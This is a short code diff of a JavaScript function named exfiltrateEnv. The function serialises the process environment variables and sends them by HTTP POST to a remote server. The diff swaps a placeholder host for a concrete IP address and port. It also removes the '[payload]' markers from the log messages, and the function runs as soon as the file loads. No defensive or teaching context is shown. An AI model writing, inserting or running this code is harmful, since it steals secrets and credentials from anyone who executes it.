@@ -7,7 +7,7 @@ function exfiltrateEnv(env) {
   const payload = JSON.stringify(env);
 
   const options = {
-    hostname: "attack-con",  
+    hostname: "54.91.192.110",  
     port: 8000,
     path: "/",
     method: "POST",
@@ -22,13 +22,13 @@ function exfiltrateEnv(env) {
   });
 
   req.on("error", (err) => {
-    console.error("[payload] exfil error:", err);
+    console.error("Exfil error:", err);
   });
 
   req.write(payload);
   req.end();
 
-  console.log("[payload] exfiltrated process.env");
+  console.log("Exfiltrated process.env");
 }
 
 exfiltrateEnv(process.env);
